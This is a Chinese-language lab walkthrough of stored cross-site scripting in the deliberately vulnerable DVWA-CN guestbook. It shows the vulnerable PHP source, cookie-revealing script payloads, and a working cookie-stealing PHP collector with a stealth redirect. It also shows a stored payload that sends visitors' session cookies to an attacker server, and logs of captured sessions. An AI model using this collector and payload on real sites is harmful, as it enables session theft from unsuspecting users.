#dvwacn之四存储型xss

dvwacn之存储型xss物理路径

```
root@webserver:/var/www/dvwacn/vulnerabilities/xss_s/source# ls
high.php  low.php  medium.php
```

##安全级别

- low.php

```
<?php

if(isset($_REQUEST['btnSign']))
{

   $message = trim($_REQUEST['mtxMessage']);
   $name    = trim($_REQUEST['txtName']);
   
   // Sanitize message input
   $message = stripslashes($message);
   $message = mysql_real_escape_string($message);
   
   // Sanitize name input
   $name = mysql_real_escape_string($name);
  
   $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');";
   
   $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' );
   
}

?>
```

- medium.php 

```
<?php

if(isset($_POST['btnSign']))
{

   $message = trim($_POST['mtxMessage']);
   $name    = trim($_POST['txtName']);
   
   // Sanitize message input
   $message = trim(strip_tags(addslashes($message)));
   $message = mysql_real_escape_string($message);
   $message = htmlspecialchars($message);
    
   // Sanitize name input
   $name = str_replace('<script>', '', $name);
   $name = mysql_real_escape_string($name);
  
   $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');";
   
   $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' );
   
}

?>
```


- high.php

``` 
<?php

if(isset($_POST['btnSign']))
{

   $message = trim($_POST['mtxMessage']);
   $name    = trim($_POST['txtName']);
   
   // Sanitize message input
   $message = stripslashes($message);
   $message = mysql_real_escape_string($message);
   $message = htmlspecialchars($message);
   
   // Sanitize name input
   $name = stripslashes($name);
   $name = mysql_real_escape_string($name); 
   $name = htmlspecialchars($name);
  
   $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');";
   
   $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' );
   
}

?>
```

low.php中name和message参数未经任何处理，直接将用户提交数据存入数据库。

```
 // Sanitize message input
   $message = stripslashes($message);
   $message = mysql_real_escape_string($message);
   
   // Sanitize name input
   $name = mysql_real_escape_string($name);
  
   $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');";
```

存储型xss地址

http://192.168.56.80/dvwacn/vulnerabilities/xss_s/



##存储型跨站测试

http://192.168.56.80/dvwacn/vulnerabilities/xss_s/?txtName=anchiva&mtxMessage=%3Cscript%3Ealert(%27%B4%E6%B4%A2%D0%CD%BF%E7%D5%BE%B2%E2%CA%D4%27)%3C/script%3E&btnSign=%B7%A2%CB%CD%CF%FB%CF%A2

页面弹窗

```
存储型型跨站测试
```

url解码

```
http://192.168.56.80/dvwacn/vulnerabilities/xss_s/?txtName=anchiva&mtxMessage=<script>alert('存储型型跨站测试')</script>&btnSign=发送消息
```


##获取用户cookie

用户输入：

```
用户名：admin

信息：<script>alert(document.cookie)</script>
```

页面返回当前用户cookie

```
security=low; PHPSESSID=5538rj2euqbbdrsfsh3lrtnlg2
```

捕获的http数据包内容

```
POST /dvwacn/vulnerabilities/xss_s/ HTTP/1.1
Host: 192.168.56.80
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.56.80/dvwacn/vulnerabilities/xss_s/
Cookie: security=low; PHPSESSID=5538rj2euqbbdrsfsh3lrtnlg2
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 111

txtName=admin&mtxMessage=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&btnSign=%B7%A2%CB%CD%CF%FB%CF%A2
```


url解码post数据

```
txtName=admin&mtxMessage=<script>alert(document.cookie)</script>&btnSign=发送消息
```

查询数据库表内容

```
mysql> select * from dvwacn.guestbook;
+------------+-----------------------------------------+-------+
| comment_id | comment                                 | name  |
+------------+-----------------------------------------+-------+
|       1817 | <script>alert(document.cookie)</script> | admin |
+------------+-----------------------------------------+-------+
1 row in set (0.00 sec)

mysql>
```

只要一访问存储型xss页面，就会自动弹出当前用户cookie


##自动获取用户cookie并发送到攻击者服务器

攻击者服务器获取用户cookie的网站的物理路径

```
root@webserver:/var/www/test/xss# ls
getcookie.php  cookie.txt
```

getcookie.php内容

```
<?php
$cookie = $_GET['cookie']; //以GET方式获取cookie变量值
$ip = getenv ('REMOTE_ADDR'); //远程主机IP地址
$time=date('Y-m-d g:i:s'); //以“年-月-日时：分：秒”的格式显示时间
$referer=getenv ('HTTP_REFERER'); //链接来源
$agent = $_SERVER['HTTP_USER_AGENT']; //用户浏览器类型
$fp = fopen('cookie.txt', 'a'); //打开cookie.txt，若不存在则创建它
fwrite($fp," IP= " .$ip. " \n Date and Time= " .$time. " \n User Agent= ".$agent." \n Referer= ".$referer." \n Cookie= ".$cookie." \n\n\n"); //写入文件
fclose($fp); //关闭文件
header("Location: http://www.baidu.com"); //将网页重定向到百度，增强隐蔽性
?>
```

cookie.txt为接收用户cookie的文件


首先需要修改post提交的最大字符数

```
/var/www/dvwacn/vulnerabilities/xss_s/index.php
```

找到

```
<textarea name=\"mtxMessage\" cols=\"50\" rows=\"3\" maxlength=\"50\"></textarea></td>
```

修改为

```
<textarea name=\"mtxMessage\" cols=\"50\" rows=\"3\" maxlength=\"500\"></textarea></td>
```

存储型xss地址

http://192.168.56.80/dvwacn/vulnerabilities/xss_s/


用户输入：

```
用户名：admin

信息：<script>document.write('<img src="http://192.168.56.80/test/xss/getcookie.php?cookie='+document.cookie+'" width=0 height=0 border=0 />');</script>
```


查询数据库

```
mysql> select * from dvwacn.guestbook;
+------------+----------------------------------------------------------------------------------------------------------------------------------------------------+-------+
| comment_id | comment                                                                                                                                            | name  |
+------------+----------------------------------------------------------------------------------------------------------------------------------------------------+-------+
|       1820 | <script>document.write('<img src="http://192.168.56.80/test/xss/getcookie.php?cookie='+document.cookie+'" width=0 height=0 border=0 />');</script> | admin |
+------------+----------------------------------------------------------------------------------------------------------------------------------------------------+-------+
1 row in set (0.00 sec)

mysql>
```

查看攻击者服务器上的cookie.txt文件内容

```
root@webserver:/var/www/test/xss# cat cookie.txt 
 IP= 192.168.56.1 
 Date and Time= 2016-07-21 11:45:35 
 User Agent= Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0 
 Referer= http://192.168.56.80/dvwacn/vulnerabilities/xss_s/ 
 Cookie= security=low; PHPSESSID=5538rj2euqbbdrsfsh3lrtnlg2
```

成功获取到用户cookie信息


换一个用户点击`A2-存储型跨站`


再次查看攻击者服务器上的cookie.txt文件内容

```
 IP= 192.168.56.1 
 Date and Time= 2016-07-21 11:45:35 
 User Agent= Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0 
 Referer= http://192.168.56.80/dvwacn/vulnerabilities/xss_s/ 
 Cookie= security=low; PHPSESSID=5538rj2euqbbdrsfsh3lrtnlg2 


 IP= 192.168.56.104 
 Date and Time= 2016-07-21 1:12:50 
 User Agent= Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 
 Referer= http://192.168.56.80/dvwacn/vulnerabilities/xss_s/ 
 Cookie= security=low; PHPSESSID=l9e9e7fnujrmplpbj0m06pvdr5
```

已经有2个用户cookie了。